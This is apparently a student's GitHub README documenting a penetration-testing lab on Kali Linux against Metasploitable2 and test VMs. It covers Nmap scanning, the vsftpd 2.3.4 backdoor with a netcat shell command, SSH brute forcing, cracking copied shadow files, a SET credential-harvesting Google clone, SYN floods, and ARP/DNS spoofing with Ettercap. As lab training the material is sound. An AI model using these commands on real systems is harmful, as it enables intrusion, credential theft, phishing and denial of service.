# PentestLab

## Objective

This Pentest Lab is a project aimed at exploring various penetration testing techniques and tools using Kali Linux. The objective is to simulate real-world scenarios and gain hands-on experience in ethical hacking and cybersecurity.


### Skills Learned

- Active information gathering techniques with Nmap
- Exploitation of vulnerabilities using Metasploit and custom Python scripts
- Brute force attacks using tools like Hydra, ncrack, and Medusa
- Password cracking using John the Ripper
- Social engineering attacks with the Social-Engineering Toolkit (SET)
- Performing TCP SYN Flood attacks using netwag, hping3, and Metasploit
- ARP and DNS cache poisoning using netwag, SET, and Ettercap

### Tools Used

- Kali Linux
- Metasploitable2 as a vulnerable machine
- Nmap
- Metasploit
- Hydra
- Ncrack
- Medusa
- John The Ripper
- Social-Engineering Toolkit
- Netwag
- Hping3
- ASYNchrone
- Wireshark
- Ettercap

## Steps

### Nmap

<details>
<summary>Active information gathering technique with Nmap</summary>

Nmap ping sweep 

![image](https://github.com/KennuC/PentestLab/assets/131323586/2ddf42c0-b8fb-4df8-8392-cf5f7347dd5d)

Scanning specific port/s

![image](https://github.com/KennuC/PentestLab/assets/131323586/9936b5dc-6329-4448-9447-b69648e48a38)

![image](https://github.com/KennuC/PentestLab/assets/131323586/c5966d39-bce2-4b6a-a212-6c84e3d5d6a3)

Specify port range

![image](https://github.com/KennuC/PentestLab/assets/131323586/79ccf79a-10a4-46f6-9645-01db36b6b946)

Scanning the top 10 popular ports.

![image](https://github.com/KennuC/PentestLab/assets/131323586/5c3a4e86-d61d-4fc6-8861-17102961a3c9)

Scanning target from a file

![image](https://github.com/KennuC/PentestLab/assets/131323586/fbb90295-50f4-41ae-ba8b-4e1d67c18093)

Saving output to file

![image](https://github.com/KennuC/PentestLab/assets/131323586/c378b918-f84d-4f76-b3a4-baa567ed5d89)

Detect service/daemon versions

![image](https://github.com/KennuC/PentestLab/assets/131323586/2ac6b195-40d0-4b00-b0a1-072f14d64764)

Stealth scan

![image](https://github.com/KennuC/PentestLab/assets/131323586/ee934aec-a659-4b34-b740-6c555ca4863f)

Using Nmap scripts

![image](https://github.com/KennuC/PentestLab/assets/131323586/2fec76bb-7595-4a88-a2a7-9fb3e37bfe1a)

</details>

### Exploiting Metasploitable2
<details>
<summary>Exploiting VSFTPD server running on Metasploitable2 using python script</summary>
1. Identify open ports and its version using `nmap -sV <IP>`

![image](https://github.com/KennuC/PentestLab/assets/131323586/7d5dc736-da47-45a1-afb6-bf66d28a7c79)

2. Researching port 21 vsftpd version 2.3.4 to find any vulnerability associated with that specific version of the service. It was found that CVE-2011-2523, vsftpd 2.3.4 contains a backdoor which opens a shell on port 6200/tcp.

![image](https://github.com/KennuC/PentestLab/assets/131323586/00fcbaba-bf4d-4f7c-97da-53a73d2d86cc)

3. Finding associated exploit and downloading using `wget` onto kali machine.

![image](https://github.com/KennuC/PentestLab/assets/131323586/4f9e9b90-3d47-4085-87a4-b3ab09d5ae28)

![image](https://github.com/KennuC/PentestLab/assets/131323586/23526e1f-d2d0-4363-8be1-1e3fc1e4585e)


4. Run script using `python3 vsftpd_234_exploit.py <IP of target> 21 "nc -nvlp 4444 -e /bin/bash"`, in new terminal run netcat to target machine on same port

![image](https://github.com/KennuC/PentestLab/assets/131323586/ada2a7b9-d110-4382-a439-8f690cccdbf7)

![image](https://github.com/KennuC/PentestLab/assets/131323586/d1c490b4-445c-4cdb-9eaf-339d6c5f5f7b)

5. Check that access was successful

![image](https://github.com/KennuC/PentestLab/assets/131323586/43afb4f4-0511-465d-b72c-472746b85f15)

</details>

<details>
<summary>Exploiting VSFTPD server running on Metasploitable2 using metasploit</summary>

1. Search for VSFTPD and then selecting appropriate module

![image](https://github.com/KennuC/PentestLab/assets/131323586/88252178-77da-47fa-b988-ddf8f49d73a0)

2. Explore `options` and set required options

![image](https://github.com/KennuC/PentestLab/assets/131323586/9ff55665-dbf2-4e12-be84-93fc930bae27)

3. Run the exploit using `run` and verify shell access using `uname -a` and `whoami`

![image](https://github.com/KennuC/PentestLab/assets/131323586/a824597c-bfcf-4b97-aa74-5acf2705b5e6)


</details>

### Brute Force
<details>
<summary>Brute forcing SSH using THC-HYDRA</summary>
  
`sudo hydra -I -L <file> -P <file> -t 4 ssh://<IP>`

`-I` instructs Hydra to show login and password attempt combinations as it is running

`-L` Specifies the path to the username list

`-P` Specifies the path to the password list

`-t 4` Specifies the number of parallel tasks (threads) to use

![image](https://github.com/KennuC/PentestLab/assets/131323586/d7bcc0a3-02f8-4fd0-b041-35271d8a4e43)

</details>

<details>
  <summary>Brute forcing SSH using ncrack</summary>
  
`sudo ncrack -p 22 -U <file> -P <file> <IP>`

`-p` specify port, port 22 for ssh

`-U` specify username list

`-P` specify password list

![image](https://github.com/KennuC/PentestLab/assets/131323586/e585c4b9-1c64-4db5-bf0b-a669355eeafe)

</details>

<details>
  <summary>Brute forcing FTP using Medusa</summary>

`sudo medusa -U <file> -P <file> -h <IP> -M ssh -f`

`-U` specify username list

`-P` specify password list

`-h` specify host

`-M` specify module, this canse SSH

`-f` tells medusa to stop after first succesful login is found

![image](https://github.com/KennuC/PentestLab/assets/131323586/659956a3-9f6b-4380-9202-338854267c5b)


</details>

<details>
  <summary>John the Ripper</summary>

Retrieve `passwd` and `shadow` file from metaspolitble using simple Python HTTP server on port 8000 and downloading using wget form Kali machine.

![image](https://github.com/KennuC/PentestLab/assets/131323586/b34d7c58-c550-428b-b57d-4517e29db707)

Use unshadow program to combine the two files in format that John can read.

![image](https://github.com/KennuC/PentestLab/assets/131323586/157695db-9a08-48b6-8ec9-5af065196046)

`sudo john --wordlist=<file> passwords.txt`

Use `sudo john --show password.txt` to show cracked passwords.

![image](https://github.com/KennuC/PentestLab/assets/131323586/c4438088-e315-4c30-b0ab-420326332ec4)


</details>

###  Credential Harvester

<details>
  
<summary>Social-Engineering Toolkit (SET)</summary>

Step 1: Starting setoolkit with `sudo setoolkit`

Step 2: Selecting Social-Engineering Attacks

![image](https://github.com/KennuC/PentestBasics/assets/131323586/9ca0f102-8d7e-4d58-9350-4d4820f96817)


Step 3: Selecting Website Attack Vectors

![image](https://github.com/KennuC/PentestBasics/assets/131323586/47bca298-a282-4744-ad4e-8ba2bc67b07b)


Step 4: Selecting Credential Harvester Attack Method

![image](https://github.com/KennuC/PentestBasics/assets/131323586/a2c2ec6f-d635-43c4-9786-485abcd72c84)

Step 5: Selecting Web Templates

![image](https://github.com/KennuC/PentestBasics/assets/131323586/09588903-ee49-4b16-ab38-6f1b25e55dd5)


Step 6: Specifying the IP of your Kali VM.

In this step, press Enter to confirm your IP.

Step 7: Choosing the Google Template.

![image](https://github.com/KennuC/PentestBasics/assets/131323586/56670b14-648f-435c-afd2-fb20dc480147)

Step 8: Opening generated Webpage from Debian VM.	

![image](https://github.com/KennuC/PentestBasics/assets/131323586/96dff459-248e-496e-a4b5-e8dd15f7af69)

Step 9: Go back to your Kali VM and observe output.	

![image](https://github.com/KennuC/PentestBasics/assets/131323586/d75880e1-530b-43ef-826c-8eea7f3bda13)

Step 10: Submit login and observe Kali VM output.

![image](https://github.com/KennuC/PentestBasics/assets/131323586/0f03af90-2f27-4f07-8706-9646c23da937)

</details>
  
### TCP SYN Flood Attack
<details>
   <summary> Perform TCP SYN Flood Attacks using netwag </summary>

Step 1: Run tshark in the client machine.	

![image](https://github.com/KennuC/PentestBasics/assets/131323586/61af2c1d-df79-4a5c-bd7c-f86470fa3413)

Step 2: Run netwag in the attacker machine. Search for `syn` and select `Synflood` form number `76`.

![image](https://github.com/KennuC/PentestBasics/assets/131323586/ad94a926-6ac5-493e-a72f-e2cb59201e97)

Step 3: Specifying Victim’s IP as destination IP and performing the attack

![image](https://github.com/KennuC/PentestBasics/assets/131323586/a9b8fa90-fdc6-4ebe-bf01-b9d51eece6e8)

</details>

<details>
   <summary> Perform TCP SYN Flood Attacks using hping3 </summary>

Step 1: Run tshark in the client machine.	

![image](https://github.com/KennuC/PentestBasics/assets/131323586/61af2c1d-df79-4a5c-bd7c-f86470fa3413)

Step 2: Performing hping3 Synflood Attack with following command `sudo hping3 -S --flood -V -p 80 <Victim’s IP>`

![image](https://github.com/KennuC/PentestBasics/assets/131323586/029e5012-f54c-462c-a917-2157fd40f9a6)

</details>


<details>
   <summary> Perform TCP SYN Flood Attacks using aSYNcrone </summary>

Step 1: Git clone aSYNcrone:

![image](https://github.com/KennuC/PentestBasics/assets/131323586/fffe4751-d7ed-4ec8-9188-5cd699ca11bd)


Step 2: Start capturing using tshark running on Victim VM 

![image](https://github.com/KennuC/PentestBasics/assets/131323586/61af2c1d-df79-4a5c-bd7c-f86470fa3413)

Step 3: Perform attack on target using aSYNcrone using `sudo ./aSYNcrone <source port> <target IP> <target port> <thread number>`

![image](https://github.com/KennuC/PentestBasics/assets/131323586/0f81dbbc-4b4e-402b-afd0-4c6cb943a216)

</details>

<details>
   <summary> Perform TCP SYN Flood Attacks using Metasploit </summary>

Step 1: Start Metasploit on Kali VM.

![image](https://github.com/KennuC/PentestBasics/assets/131323586/a539fbc9-27cc-4d84-87d5-ff943e1a75b5)

Step 2: Perform attack on target using Metasploit

`use auxiliary/dos/tcp/synflood`

`options`

`set rhosts <Target IP>`

`exploit`

![image](https://github.com/KennuC/PentestBasics/assets/131323586/90917dcd-d31e-49d4-9e29-bc7908d88d0f)

</details>

### ARP and DNS cache poisoning

<details>
<summary> Using netwag to perform ARP cache poisoning
 </summary>

Step 1: Clear existing ARP table of client VM using `sudo ip -s -s neigh flush all`

![image](https://github.com/KennuC/PentestBasics/assets/131323586/3e93cc95-3e8a-4ce6-8fea-ec0fc414bcff)

Step 2: Verify ARP table using `sudo arp -a`

![image](https://github.com/KennuC/PentestBasics/assets/131323586/58d9049b-fda3-481f-af4c-03166813346f)

Step 3: Verify connectivity between client and server using `ping`. After verifying the connectivity, check the ARP table of client.	

Step 5: Install abnd run apache2 on Server using `sudo apt install apache2` & `sudo service apache2 start`.

Step 6: Go to the client machine and Open a browser and type the IP of server	to verify apache service is running.

![image](https://github.com/KennuC/PentestBasics/assets/131323586/45660f38-a80e-44e0-9187-daa3f2dbfae7)

Step 7: To perform ARP cache poisoning we will use netwag in Attacker VM.	

![image](https://github.com/KennuC/PentestBasics/assets/131323586/abb6c3f0-9d3e-4245-b669-543cd576e6c7)

Step 8: Specify the IP of the server and run it.	

![image](https://github.com/KennuC/PentestBasics/assets/131323586/8d08e400-6dec-45d2-9613-a1e2ccecc536)

Step 10: Access apache2 webpage using the IP of the server.

Step 11: Run `sudo ip addr add <IP of server>/24 dev eth0` to enable 2nd IP on eth0 on Attacker machine	
![image](https://github.com/KennuC/PentestBasics/assets/131323586/9182ac82-4eff-4f1e-8071-9bf456874568)

</details>

<details>
<summary> Using SET to take advantage of ARP cache poisoning </summary>
Step 1: Use the following options once you run SET
  
`Social-Engineering Attacks` -> `Website Attack Vectors` -> `Credential Harvester Attack Method` -> `Web Templates` -> `Google`

![image](https://github.com/KennuC/PentestBasics/assets/131323586/446ca1c1-408e-4364-85d6-ca7bc13830b8)

Step 2: After successfully running SET, go to the Client’s browser and type Server IP	

Step 3: Input fields and observe Attacker

![image](https://github.com/KennuC/PentestBasics/assets/131323586/898e65f7-a0cd-4d9e-90f1-efc1c41813bf)

![image](https://github.com/KennuC/PentestBasics/assets/131323586/05fd394b-7922-43ed-a750-7de1ddcfe542)

</details>

<details>
<summary> Using Ettercap to perform DNS cache poisoning </summary>

Step 1: Configure `/etc/ettercap/etter.dns` and input `www.google.com PTR <IP of Attacker>` at bottom of file.

![image](https://github.com/KennuC/PentestBasics/assets/131323586/5de726e3-9c5d-4e0d-bbcd-73f821802cca)

Step 2: Clear the cache of browser and run in private window.	

Step 3: Run Ettercap dns spoof using `sudo ettercap -i eth0 -T -M arp -P dns_spoof /<IP of Client>///`

![image](https://github.com/KennuC/PentestBasics/assets/131323586/9ef75ed3-eb0c-4b3e-a2cf-fe95d7f08fa2)

</details>
